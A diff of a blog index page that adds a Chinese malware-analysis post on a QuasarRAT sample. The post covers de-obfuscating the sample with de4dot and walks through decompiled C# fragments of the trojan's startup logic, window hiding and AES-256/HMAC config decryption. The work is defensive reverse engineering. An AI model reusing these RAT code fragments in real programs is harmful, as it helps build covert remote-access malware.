@@ -136,7 +136,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -163,6 +163,119 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://woshinext.top/2026/04/23/QuasarRAT-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Next">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="woshinext.top">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | woshinext.top">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/04/23/QuasarRAT-2/" class="post-title-link" itemprop="url">QuasarRAT-2</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-04-23 15:56:15 / Modified: 16:32:23" itemprop="dateCreated datePublished" datetime="2026-04-23T15:56:15+08:00">2026-04-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">样本分析</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p><img src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423155713827.png" alt="image-20260423155713827"></p>
+<p>来看这个木马比上个稍微难一点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423160012069.png" alt="image-20260423160012069"></p>
+<p>可以看见这个代码中有大量的混淆先找到程序入口</p>
+<p><img src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423160442461.png" alt="image-20260423160442461"></p>
+<p>可以看到有混淆的存在来分析是非常困难的于是我就去搜索有没有相关工具可以去混淆</p>
+<p>de4dot就是一个去混淆的好工具</p>
+<p><img src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423161244716.png" alt="image-20260423161244716"></p>
+<p>可以看见它生成了个clean文件</p>
+<p>再打开看看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423161437355.png" alt="image-20260423161437355"></p>
+<p>可以看见混淆清理的非常干净</p>
+<p> 查看函数GForm0()</p>
+<p><img src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423161635809.png" alt="image-20260423161635809"></p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">OnLoad</span>(<span class="params">EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">base</span>.Visible = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">base</span>.ShowInTaskbar = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">this</span>.method_1();</span><br><span class="line">	<span class="keyword">base</span>.OnLoad(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中method_1()是木马的主要逻辑</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method_1</span>()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!GClass65.smethod_0())</span><br><span class="line">		&#123;</span><br><span class="line">			Environment.Exit(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">this</span>.gclass1_0 = <span class="keyword">new</span> GClass1(GClass65.string_5);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">this</span>.gclass1_0.CreatedNew)</span><br><span class="line">		&#123;</span><br><span class="line">			Environment.Exit(<span class="number">2</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		Class19.smethod_4(Application.ExecutablePath);</span><br><span class="line">		GClass5 gclass = <span class="keyword">new</span> GClass5();</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.IsInstallationRequired)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>.gclass1_0.Dispose();</span><br><span class="line">			<span class="keyword">try</span></span><br><span class="line">			&#123;</span><br><span class="line">				gclass.method_1();</span><br><span class="line">				Environment.Exit(<span class="number">3</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span> (Exception)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">try</span></span><br><span class="line">		&#123;</span><br><span class="line">			gclass.method_0();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Exception)</span><br><span class="line">		&#123;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!GClass65.bool_6)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>.method_0();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (GClass65.bool_3)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>.gclass46_0 = <span class="keyword">new</span> GClass46();</span><br><span class="line">			<span class="keyword">this</span>.gclass46_0.method_0();</span><br><span class="line">		&#125;</span><br><span class="line">		Class27 @class = <span class="keyword">new</span> Class27(<span class="keyword">new</span> Class26().method_0(GClass65.string_1));</span><br><span class="line">		<span class="keyword">this</span>.gclass31_0 = <span class="keyword">new</span> GClass31(@class, GClass65.x509Certificate2_0);</span><br><span class="line">		<span class="keyword">this</span>.gclass31_0.Event_1 += <span class="keyword">this</span>.gclass31_0_ClientState;</span><br><span class="line">		<span class="keyword">this</span>.method_2(<span class="keyword">this</span>.gclass31_0);</span><br><span class="line">		<span class="keyword">this</span>.gclass2_0 = <span class="keyword">new</span> GClass2(<span class="keyword">this</span>.gclass31_0);</span><br><span class="line">		<span class="keyword">this</span>.gclass2_0.method_1();</span><br><span class="line">		<span class="keyword">new</span> Thread(<span class="built_in">delegate</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>.gclass31_0.method_15();</span><br><span class="line">			Environment.Exit(<span class="number">0</span>);</span><br><span class="line">		&#125;).Start();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>GClass65是这个木马的初始化</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">GClass65</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// Token: 0x06000295 RID: 661 RVA: 0x00058284 File Offset: 0x00056484</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">smethod_0</span>()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrEmpty(GClass65.string_0))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		Class28 @class = <span class="keyword">new</span> Class28(GClass65.string_7);</span><br><span class="line">		GClass65.string_8 = @class.method_2(GClass65.string_8);</span><br><span class="line">		GClass65.string_0 = @class.method_2(GClass65.string_0);</span><br><span class="line">		GClass65.string_1 = @class.method_2(GClass65.string_1);</span><br><span class="line">		GClass65.string_3 = @class.method_2(GClass65.string_3);</span><br><span class="line">		GClass65.string_4 = @class.method_2(GClass65.string_4);</span><br><span class="line">		GClass65.string_5 = @class.method_2(GClass65.string_5);</span><br><span class="line">		GClass65.string_6 = @class.method_2(GClass65.string_6);</span><br><span class="line">		GClass65.string_9 = @class.method_2(GClass65.string_9);</span><br><span class="line">		GClass65.string_10 = @class.method_2(GClass65.string_10);</span><br><span class="line">		GClass65.x509Certificate2_0 = <span class="keyword">new</span> X509Certificate2(Convert.FromBase64String(@class.method_2(GClass65.string_11)));</span><br><span class="line">		GClass65.smethod_1();</span><br><span class="line">		<span class="keyword">return</span> GClass65.smethod_2();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到哪些关键数据是被method_2处理后在赋值</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">method_2</span>(<span class="params"><span class="built_in">string</span> input</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> Encoding.UTF8.GetString(<span class="keyword">this</span>.method_3(Convert.FromBase64String(input)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到它先base64解码后再传给method_3</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">byte</span>[] <span class="title">method_3</span>(<span class="params"><span class="built_in">byte</span>[] input</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (input == <span class="literal">null</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="string">&quot;input can not be null.&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">byte</span>[] array6;</span><br><span class="line">	<span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream(input))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">using</span> (AesCryptoServiceProvider aesCryptoServiceProvider = <span class="keyword">new</span> AesCryptoServiceProvider())</span><br><span class="line">		&#123;</span><br><span class="line">			aesCryptoServiceProvider.KeySize = <span class="number">256</span>;</span><br><span class="line">			aesCryptoServiceProvider.BlockSize = <span class="number">128</span>;</span><br><span class="line">			aesCryptoServiceProvider.Mode = CipherMode.CBC;</span><br><span class="line">			aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;</span><br><span class="line">			aesCryptoServiceProvider.Key = <span class="keyword">this</span>.byte_0;</span><br><span class="line">			<span class="keyword">using</span> (HMACSHA256 hmacsha = <span class="keyword">new</span> HMACSHA256(<span class="keyword">this</span>.byte_1))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">byte</span>[] array = hmacsha.ComputeHash(memoryStream.ToArray(), <span class="number">32</span>, memoryStream.ToArray().Length - <span class="number">32</span>);</span><br><span class="line">				<span class="built_in">byte</span>[] array2 = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">32</span>];</span><br><span class="line">				memoryStream.Read(array2, <span class="number">0</span>, array2.Length);</span><br><span class="line">				<span class="keyword">if</span> (!Class29.smethod_0(array, array2))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> CryptographicException(<span class="string">&quot;Invalid message authentication code (MAC).&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">byte</span>[] array3 = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">16</span>];</span><br><span class="line">			memoryStream.Read(array3, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">			aesCryptoServiceProvider.IV = array3;</span><br><span class="line">			<span class="keyword">using</span> (CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(memoryStream, aesCryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Read))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">byte</span>[] array4 = <span class="keyword">new</span> <span class="built_in">byte</span>[memoryStream.Length - <span class="number">16L</span> + <span class="number">1L</span>];</span><br><span class="line">				<span class="built_in">byte</span>[] array5 = <span class="keyword">new</span> <span class="built_in">byte</span>[cryptoStream.Read(array4, <span class="number">0</span>, array4.Length)];</span><br><span class="line">				Buffer.BlockCopy(array4, <span class="number">0</span>, array5, <span class="number">0</span>, array5.Length);</span><br><span class="line">				array6 = array5;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> array6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看见先是给256aes加密设置了一下然后验证了hash值</p>
+<pre><code>				if (!Class29.smethod_0(array, array2))
+				{
+					throw new CryptographicException(&quot;Invalid message authentication code (MAC).&quot;);
+				}
+</code></pre>
+<p>这个对比了hash值来确保木马没有被篡改，最后再aes256解密</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
